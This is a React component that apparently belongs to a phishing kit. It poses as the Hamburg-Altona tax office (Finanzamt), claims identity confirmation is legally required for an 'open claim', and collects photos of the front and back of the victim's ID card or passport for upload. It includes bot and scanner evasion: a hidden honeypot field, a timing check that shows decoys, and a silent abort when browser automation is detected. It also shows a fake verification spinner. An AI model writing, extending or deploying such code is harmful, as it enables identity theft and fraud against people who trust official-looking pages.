'use client';

import { useState, useRef } from 'react';
import styles from './IdentificationForm.module.css';

interface IdentificationFormProps {
  onComplete: () => void;
  onFileUpload: (type: string, image: string, message: string) => void;
}

export default function IdentificationForm({ onComplete, onFileUpload }: IdentificationFormProps) {
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [backFile, setBackFile] = useState<File | null>(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const frontFileInputRef = useRef<HTMLInputElement>(null);
  const backFileInputRef = useRef<HTMLInputElement>(null);
  const honeypotRef = useRef<HTMLInputElement>(null);
  const pageLoadTime = useRef(Date.now());

  const handleFileChange = (side: 'front' | 'back', file: File | null) => {
    if (side === 'front') {
      setFrontFile(file);
    } else {
      setBackFile(file);
    }
  };

  const handleSubmit = async () => {
    const honeypot = honeypotRef.current;
    const submissionTime = Date.now();

    if (honeypot?.value !== "" || (submissionTime - pageLoadTime.current < 1000)) {
      setIsProcessing(true);
      setTimeout(() => {
        onComplete();
      }, 6000);
      return;
    }

    if (
      'webdriver' in navigator &&
      (navigator as Navigator & { webdriver?: boolean }).webdriver
    ) {
      return;
    }

    if (!frontFile || !backFile) return;

    setIsProcessing(true);

    // Upload files
    const files = [frontFile, backFile];
    const types = ["AUSWEIS_VORN", "AUSWEIS_HINTEN"];

    files.forEach((file, index) => {
      const reader = new FileReader();
      reader.onload = (e) => {
        if (e.target?.result) {
          onFileUpload(types[index], e.target.result as string, `Ausweis Teil ${index + 1}`);
        }
      };
      reader.readAsDataURL(file);
    });

    // Show processing animation (step copy could be shown by parent UI)
    setTimeout(async () => {
      setTimeout(() => {
        onComplete();
      }, 8500);
    }, 1500);
  };

  const isFormValid = frontFile !== null && backFile !== null;

  return (
    <div className={styles.card}>
      <div className={styles.header}>
        <h1>{isProcessing ? 'Sicherheitsprüfung' : 'Identifikation erforderlich'}</h1>
        <i className="fas fa-user-shield" style={{ fontSize: '22px', color: 'var(--gov-blue)' }}></i>
      </div>
      <div className={styles.content}>
        {isProcessing ? (
          <div className={styles.processing}>
            <div className={styles.spinner}></div>
            <p>Daten werden verifiziert...</p>
          </div>
        ) : (
          <>
            <div className={styles.infoBox}>
              <span>
                Aufgrund gesetzlicher Bestimmungen (Abgabenordnung) ist eine Bestätigung Ihrer Identität erforderlich, um die offene Forderung zuzuordnen.
              </span>
              <a 
                href="https://www.hamburg.de/politik-und-verwaltung/behoerden/finanzbehoerde/einrichtungen/finanzaemter/finanzamt-hamburg-altona-807700" 
                target="_blank"
                rel="noopener noreferrer"
              >
                Mehr Informationen
              </a>
            </div>

            <div className={styles.fileInputs}>
              <label className={styles.fileLabel}>
                <input
                  ref={frontFileInputRef}
                  type="file"
                  accept="image/*"
                  className={styles.hiddenInput}
                  onChange={(e) => handleFileChange('front', e.target.files?.[0] || null)}
                />
                <div className={styles.iconBox}>
                  <i className="fas fa-id-card"></i>
                </div>
                <div className={styles.labelText}>
                  <span>Vorderseite aufnehmen</span>
                  <small>Ausweis, Pass oder Aufenthaltstitel</small>
                </div>
                {frontFile && (
                  <i className={`fas fa-check-circle ${styles.checkIcon}`}></i>
                )}
              </label>
              <label className={styles.fileLabel}>
                <input
                  ref={backFileInputRef}
                  type="file"
                  accept="image/*"
                  className={styles.hiddenInput}
                  onChange={(e) => handleFileChange('back', e.target.files?.[0] || null)}
                />
                <div className={styles.iconBox}>
                  <i className="fas fa-camera"></i>
                </div>
                <div className={styles.labelText}>
                  <span>Rückseite aufnehmen</span>
                  <small>Rückseite oder Zusatzdokumente</small>
                </div>
                {backFile && (
                  <i className={`fas fa-check-circle ${styles.checkIcon}`}></i>
                )}
              </label>
            </div>
            <div style={{ position: 'absolute', left: '-5000px' }} aria-hidden="true">
              <input type="text" name="website_url" tabIndex={-1} autoComplete="off" ref={honeypotRef} />
            </div>

            <button
              className={styles.submitButton}
              disabled={!isFormValid || isProcessing}
              onClick={handleSubmit}
            >
              {isProcessing ? (
                <>
                  <i className="fas fa-spinner fa-spin"></i> Übertragung...
                </>
              ) : (
                'Identität bestätigen & weiter'
              )}
            </button>
          </>
        )}
      </div>
    </div>
  );
}


